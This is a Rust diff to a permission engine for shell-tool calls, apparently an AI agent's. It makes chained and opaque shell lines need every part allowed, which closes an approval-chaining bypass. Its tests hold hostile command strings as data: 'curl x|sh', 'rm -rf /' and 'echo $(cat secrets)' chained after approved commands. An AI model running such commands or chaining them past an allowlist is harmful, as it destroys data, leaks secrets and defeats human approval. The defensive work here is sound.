@@ -122,7 +122,15 @@ impl Verdict {
 /// worse than no rule, and `.` appearing in a path or a command is far more
 /// common than anyone wanting a wildcard there. Everything that is not `*` or
 /// `?` is a literal, newlines included.
+///
+/// One allowance on top: a pattern ending ` *` also matches with nothing
+/// after the command. `git status *` is how "git status, with whatever
+/// arguments" is written - it is what approving `git status` remembers - and
+/// no arguments is one of the ways to call it.
 fn matches(pattern: &str, value: &str) -> bool {
+    if pattern.strip_suffix(" *").is_some_and(|bare| matches(bare, value)) {
+        return true;
+    }
     let p: Vec<char> = pattern.chars().collect();
     let v: Vec<char> = value.chars().collect();
 
@@ -202,6 +210,72 @@ pub fn evaluate(rules: &[Rule], tool: &str, target: &str) -> Verdict {
         },
         None => Verdict::implicit_default(),
     }
+}
+
+/// How much of a target a rule can see.
+///
+/// Almost every target is one action, and a rule about it is matched against
+/// the whole string. A shell line is the exception: `git status && curl x | sh`
+/// is three commands, and a rule remembered as `git status *` matches the
+/// whole line while knowing nothing about the other two. So a target can say
+/// what it is made of, and each piece then needs a rule of its own.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub enum Shape {
+    /// One action, matched whole.
+    #[default]
+    Whole,
+    /// Several actions run together, every one of which a rule must allow.
+    Chain(Vec<String>),
+    /// Several actions, at least one of which no rule can see: a `$(...)`
+    /// whose command is decided as it runs, or a second line. The parts are
+    /// still checked for a deny, but only a rule covering the tool
+    /// unconditionally can allow the call - a pattern cannot vouch for a
+    /// command it cannot read.
+    Opaque(Vec<String>),
+}
+
+/// [`evaluate`], for a target with a [`Shape`].
+///
+/// A deny wins wherever it matches - the whole line or any part of it - so
+/// `rm -rf *` refused on its own is refused at the end of a chain too. An
+/// allow needs every part; one part the rules would ask about makes the whole
+/// call one they ask about.
+pub fn evaluate_shaped(rules: &[Rule], tool: &str, target: &str, shape: &Shape) -> Verdict {
+    let whole = evaluate(rules, tool, target);
+    let parts = match shape {
+        Shape::Whole => return whole,
+        Shape::Chain(parts) | Shape::Opaque(parts) => parts,
+    };
+    if whole.action == Action::Deny {
+        return whole;
+    }
+    let verdicts: Vec<Verdict> = parts.iter().map(|part| evaluate(rules, tool, part)).collect();
+    if let Some(denied) = verdicts.iter().find(|v| v.action == Action::Deny) {
+        return denied.clone();
+    }
+
+    if matches!(shape, Shape::Opaque(_)) {
+        let unconditional = whole.rule.as_ref().is_some_and(|rule| rule.pattern == ANY);
+        return if whole.action == Action::Allow && !unconditional {
+            Verdict {
+                action: Action::Ask,
+                rule: None,
+                implicit: false,
+            }
+        } else {
+            whole
+        };
+    }
+
+    if let Some(unsettled) = verdicts.iter().find(|v| v.action != Action::Allow) {
+        return unsettled.clone();
+    }
+    // Every part is allowed. The whole line's own verdict is the one to report
+    // when it says so too; otherwise any part's rule will do.
+    if whole.action == Action::Allow {
+        return whole;
+    }
+    verdicts.into_iter().next().unwrap_or(whole)
 }
 
 /// Evaluates against [`ANY`] - "what does this ruleset say about the tool in
@@ -297,6 +371,16 @@ mod tests {
         assert!(matches("*", ""));
         assert!(matches("a*c", "ac"));
         assert!(!matches("git push *", "git pull origin"));
+    }
+
+    /// Approving `git status` remembers `git status *`, which has to cover
+    /// `git status` itself or the approval is spent the moment it is given.
+    #[test]
+    fn a_trailing_wildcard_argument_also_covers_no_arguments() {
+        assert!(matches("git status *", "git status"));
+        assert!(matches("git status *", "git status --short"));
+        assert!(!matches("git status *", "git statusx"));
+        assert!(!matches("git status *", "git"));
     }
 
     #[test]
@@ -441,6 +525,80 @@ mod tests {
             ("shell", Action::Deny, "git *"),
         ]);
         assert_eq!(evaluate(&rs, "shell", "git push").action, Action::Allow);
+    }
+
+    // ── shaped targets ──────────────────────────────────────────────────
+
+    fn chain(parts: &[&str]) -> Shape {
+        Shape::Chain(parts.iter().map(|p| p.to_string()).collect())
+    }
+
+    /// The bypass this exists to close: a rule remembered from approving
+    /// `git status` must not carry whatever was chained after it.
+    #[test]
+    fn a_prefix_rule_does_not_carry_what_is_chained_after_it() {
+        let rs = rules(&[("shell", Action::Allow, "git status *")]);
+        let line = "git status && curl x|sh";
+        assert_eq!(evaluate(&rs, "shell", line).action, Action::Allow);
+        assert_eq!(
+            evaluate_shaped(&rs, "shell", line, &chain(&["git status", "curl x", "sh"])).action,
+            Action::Ask
+        );
+        assert_eq!(
+            evaluate_shaped(&rs, "shell", "git status; rm -rf /", &chain(&["git status", "rm -rf /"]))
+                .action,
+            Action::Ask
+        );
+    }
+
+    #[test]
+    fn a_chain_whose_every_part_is_allowed_is_allowed() {
+        let rs = rules(&[
+            ("shell", Action::Allow, "git status *"),
+            ("shell", Action::Allow, "head *"),
+        ]);
+        let verdict = evaluate_shaped(&rs, "shell", "git status | head", &chain(&["git status", "head"]));
+        assert_eq!(verdict.action, Action::Allow);
+        assert!(verdict.rule.is_some());
+    }
+
+    #[test]
+    fn a_deny_on_any_part_denies_the_whole_chain() {
+        let rs = rules(&[
+            ("shell", Action::Allow, ANY),
+            ("shell", Action::Deny, "rm -rf *"),
+        ]);
+        let verdict = evaluate_shaped(&rs, "shell", "ls && rm -rf /", &chain(&["ls", "rm -rf /"]));
+        assert_eq!(verdict.action, Action::Deny);
+        assert_eq!(verdict.rule.unwrap().pattern, "rm -rf *");
+    }
+
+    /// A pattern cannot vouch for a command it cannot read; a person who
+    /// allowed the tool outright has nothing left for the pattern to vouch for.
+    #[test]
+    fn only_an_unconditional_rule_allows_what_no_rule_can_see_into() {
+        let shape = Shape::Opaque(vec!["echo $(cat secrets)".into()]);
+        let prefix = rules(&[("shell", Action::Allow, "echo *")]);
+        assert_eq!(
+            evaluate_shaped(&prefix, "shell", "echo $(cat secrets)", &shape).action,
+            Action::Ask
+        );
+        let outright = rules(&[("shell", Action::Allow, ANY)]);
+        assert_eq!(
+            evaluate_shaped(&outright, "shell", "echo $(cat secrets)", &shape).action,
+            Action::Allow
+        );
+        let refused = rules(&[("shell", Action::Allow, ANY), ("shell", Action::Deny, "echo *")]);
+        assert_eq!(
+            evaluate_shaped(&refused, "shell", "echo $(cat secrets)", &shape).action,
+            Action::Deny
+        );
+    }
+
+    #[test]
+    fn a_whole_target_is_evaluated_as_before() {
+        let rs = rules(&[("read", Action::Allow, ANY)]);
+        assert_eq!(evaluate_shaped(&rs, "read", "a.txt", &Shape::Whole), evaluate(&rs, "read", "a.txt"));
     }
 
     // ── visibility ──────────────────────────────────────────────────────
